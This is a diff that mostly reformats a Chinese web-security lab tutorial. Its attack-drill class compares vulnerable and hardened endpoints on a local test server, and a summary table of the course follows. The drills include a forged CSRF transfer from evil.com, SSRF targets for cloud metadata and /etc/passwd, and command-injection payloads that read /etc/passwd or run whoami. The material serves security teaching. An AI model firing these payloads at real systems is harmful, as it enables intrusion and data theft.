+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ content: payload }),
       });
       const safeText = await safeRes.text();
-      const safeProtected = safeText.includes('&lt;') || safeText.includes('&gt;');
-      console.log(`  🟢 Safe endpoint: ${safeProtected ? 'Protected ✅' : 'EXPLOITED ❌'}`);
+      const safeProtected =
+        safeText.includes("&lt;") || safeText.includes("&gt;");
+      console.log(
+        `  🟢 Safe endpoint: ${safeProtected ? "Protected ✅" : "EXPLOITED ❌"}`,
+      );
     }
   }
 
@@ -2227,67 +2386,79 @@ class AttackScripts {
    * 演练 2: CSRF 攻击模拟
    */
   static async testCSRF(baseUrl) {
-    console.log('\n=== 演练 2: CSRF 攻击模拟 ===\n');
+    console.log("\n=== 演练 2: CSRF 攻击模拟 ===\n");
 
     // 模拟攻击者页面发起的请求（无 CSRF token）
     const res = await fetch(`${baseUrl}/vulnerable/transfer`, {
-      method: 'POST',
+      method: "POST",
       headers: {
-        'Content-Type': 'application/x-www-form-urlencoded',
-        'Origin': 'https://evil.com',
-        'Referer': 'https://evil.com/attack'
+        "Content-Type": "application/x-www-form-urlencoded",
+        Origin: "https://evil.com",
+        Referer: "https://evil.com/attack",
       },
-      body: 'to=attacker&amount=1000'
+      body: "to=attacker&amount=1000",
     });
 
     const data = await res.json();
     console.log(`🔴 Vulnerable endpoint: ${JSON.stringify(data)}`);
-    console.log(`   Status: ${res.status === 200 ? 'EXPLOITED ❌' : 'Protected ✅'}`);
+    console.log(
+      `   Status: ${res.status === 200 ? "EXPLOITED ❌" : "Protected ✅"}`,
+    );
 
     // 安全端点
     const safeRes = await fetch(`${baseUrl}/safe/transfer`, {
-      method: 'POST',
+      method: "POST",
       headers: {
-        'Content-Type': 'application/x-www-form-urlencoded',
-        'Origin': 'https://evil.com',
-        'Referer': 'https://evil.com/attack'
+        "Content-Type": "application/x-www-form-urlencoded",
+        Origin: "https://evil.com",
+        Referer: "https://evil.com/attack",
       },
-      body: 'to=attacker&amount=1000'
+      body: "to=attacker&amount=1000",
     });
 
     const safeData = await safeRes.json();
     console.log(`🟢 Safe endpoint: ${JSON.stringify(safeData)}`);
-    console.log(`   Status: ${safeRes.status === 403 ? 'Protected ✅' : 'EXPLOITED ❌'}`);
+    console.log(
+      `   Status: ${safeRes.status === 403 ? "Protected ✅" : "EXPLOITED ❌"}`,
+    );
   }
 
   /**
    * 演练 3: SSRF 攻击模拟
    */
   static async testSSRF(baseUrl) {
-    console.log('\n=== 演练 3: SSRF 攻击模拟 ===\n');
+    console.log("\n=== 演练 3: SSRF 攻击模拟 ===\n");
 
     const targets = [
-      'http://169.254.169.254/latest/meta-data/',
-      'http://localhost:6379/',
-      'file:///etc/passwd',
-      'http://example.com/',
+      "http://169.254.169.254/latest/meta-data/",
+      "http://localhost:6379/",
+      "file:///etc/passwd",
+      "http://example.com/",
     ];
 
     for (const target of targets) {
       console.log(`\n📤 Target: ${target}`);
 
       try {
-        const res = await fetch(`${baseUrl}/vulnerable/fetch?url=${encodeURIComponent(target)}`);
-        console.log(`  🔴 Vulnerable: ${res.status} — ${res.status === 200 ? 'EXPLOITED ❌' : 'Blocked ✅'}`);
+        const res = await fetch(
+          `${baseUrl}/vulnerable/fetch?url=${encodeURIComponent(target)}`,
+        );
+        console.log(
+          `  🔴 Vulnerable: ${res.status} — ${res.status === 200 ? "EXPLOITED ❌" : "Blocked ✅"}`,
+        );
       } catch (err) {
         console.log(`  🔴 Vulnerable: Error — Blocked ✅`);
       }
 
       try {
-        const res = await fetch(`${baseUrl}/safe/fetch?url=${encodeURIComponent(target)}`);
+        const res = await fetch(
+          `${baseUrl}/safe/fetch?url=${encodeURIComponent(target)}`,
+        );
         const data = await res.json();
-        console.log(`  🟢 Safe: ${res.status} — ${data.error || 'OK'}`);
-        console.log(`     Status: ${res.status === 403 ? 'Protected ✅' : 'EXPLOITED ❌'}`);
+        console.log(`  🟢 Safe: ${res.status} — ${data.error || "OK"}`);
+        console.log(
+          `     Status: ${res.status === 403 ? "Protected ✅" : "EXPLOITED ❌"}`,
+        );
       } catch (err) {
         console.log(`  🟢 Safe: Error — Blocked ✅`);
       }
@@ -2298,14 +2469,14 @@ class AttackScripts {
    * 演练 4: 命令注入攻击模拟
    */
   static async testCommandInjection(baseUrl) {
-    console.log('\n=== 演练 4: 命令注入攻击模拟 ===\n');
+    console.log("\n=== 演练 4: 命令注入攻击模拟 ===\n");
 
     const payloads = [
-      '8.8.8.8',
-      '8.8.8.8; whoami',
-      '8.8.8.8 && cat /etc/passwd',
-      '8.8.8.8 | ls -la',
-      '$(whoami)',
+      "8.8.8.8",
+      "8.8.8.8; whoami",
+      "8.8.8.8 && cat /etc/passwd",
+      "8.8.8.8 | ls -la",
+      "$(whoami)",
     ];
 
     for (const payload of payloads) {
@@ -2313,26 +2484,30 @@ class AttackScripts {
 
       try {
         const res = await fetch(`${baseUrl}/vulnerable/ping`, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ host: payload })
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ host: payload }),
         });
         const text = await res.text();
-        const isExploited = text.includes('root') || text.includes('bin/bash');
-        console.log(`  🔴 Vulnerable: ${isExploited ? 'EXPLOITED ❌' : 'Blocked ✅'}`);
+        const isExploited = text.includes("root") || text.includes("bin/bash");
+        console.log(
+          `  🔴 Vulnerable: ${isExploited ? "EXPLOITED ❌" : "Blocked ✅"}`,
+        );
       } catch (err) {
         console.log(`  🔴 Vulnerable: Error`);
       }
 
       try {
         const res = await fetch(`${baseUrl}/safe/ping`, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ host: payload })
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ host: payload }),
         });
         const data = await res.json();
-        console.log(`  🟢 Safe: ${data.error || 'OK'}`);
-        console.log(`     Status: ${res.status === 400 ? 'Protected ✅' : 'EXPLOITED ❌'}`);
+        console.log(`  🟢 Safe: ${data.error || "OK"}`);
+        console.log(
+          `     Status: ${res.status === 400 ? "Protected ✅" : "EXPLOITED ❌"}`,
+        );
       } catch (err) {
         console.log(`  🟢 Safe: Error — Blocked ✅`);
       }
@@ -2342,8 +2517,8 @@ class AttackScripts {
   /**
    * 运行所有演练
    */
-  static async runAll(baseUrl = 'http://localhost:3456') {
-    console.log('🔐 Web 安全攻防演练实验室\n');
+  static async runAll(baseUrl = "http://localhost:3456") {
+    console.log("🔐 Web 安全攻防演练实验室\n");
     console.log(`目标: ${baseUrl}\n`);
 
     await this.testXSS(baseUrl);
@@ -2351,9 +2526,9 @@ class AttackScripts {
     await this.testSSRF(baseUrl);
     await this.testCommandInjection(baseUrl);
 
-    console.log('\n📊 演练完成！');
-    console.log('💡 提示: 所有漏洞端点都有对应的安全版本');
-    console.log('💡 对比两者的差异，理解安全防御的原理');
+    console.log("\n📊 演练完成！");
+    console.log("💡 提示: 所有漏洞端点都有对应的安全版本");
+    console.log("💡 对比两者的差异，理解安全防御的原理");
   }
 }
 
@@ -2508,15 +2683,15 @@ module.exports = AttackScripts;
 
 ### 第六轮 vs 前五轮 — 进阶内容
 
-| 主题 | 前五轮覆盖 | 第六轮新增 |
-|------|-----------|-----------|
-| XSS | 基础三种类型 | DOM Clobbering, Mutation XSS, Script Gadgets, Blind XSS |
-| CSRF | SameSite 基础 | Lax+POST 绕过, 双重 Cookie 完整实现, 攻击面映射 |
-| 服务端注入 | 未覆盖 | SSTI, SSRF, 命令注入完整攻防 |
-| 净化 | 基础转义 | DOMPurify 深度配置, 多层净化架构, 服务端净化 |
-| CSP | 基础配置 | CSP Level 3, Trusted Types, 完整安全头矩阵 |
-| 安全工程化 | 未覆盖 | ESLint 安全规则, GitHub Actions, 自动化测试框架 |
-| 攻防演练 | 基础演示 | 8 个漏洞端点 + 安全端点对比, 完整攻击脚本 |
+| 主题       | 前五轮覆盖    | 第六轮新增                                              |
+| ---------- | ------------- | ------------------------------------------------------- |
+| XSS        | 基础三种类型  | DOM Clobbering, Mutation XSS, Script Gadgets, Blind XSS |
+| CSRF       | SameSite 基础 | Lax+POST 绕过, 双重 Cookie 完整实现, 攻击面映射         |
+| 服务端注入 | 未覆盖        | SSTI, SSRF, 命令注入完整攻防                            |
+| 净化       | 基础转义      | DOMPurify 深度配置, 多层净化架构, 服务端净化            |
+| CSP        | 基础配置      | CSP Level 3, Trusted Types, 完整安全头矩阵              |
+| 安全工程化 | 未覆盖        | ESLint 安全规则, GitHub Actions, 自动化测试框架         |
+| 攻防演练   | 基础演示      | 8 个漏洞端点 + 安全端点对比, 完整攻击脚本               |
 
 ### 核心收获
 
@@ -2529,5 +2704,5 @@ module.exports = AttackScripts;
 
 ---
 
-*本专项为 Web 安全第六轮迭代，在前五轮基础上深入高级攻击技术和工程化实践。*
-*安全不是一次性的任务，而是持续的过程。*
+_本专项为 Web 安全第六轮迭代，在前五轮基础上深入高级攻击技术和工程化实践。_
+_安全不是一次性的任务，而是持续的过程。_
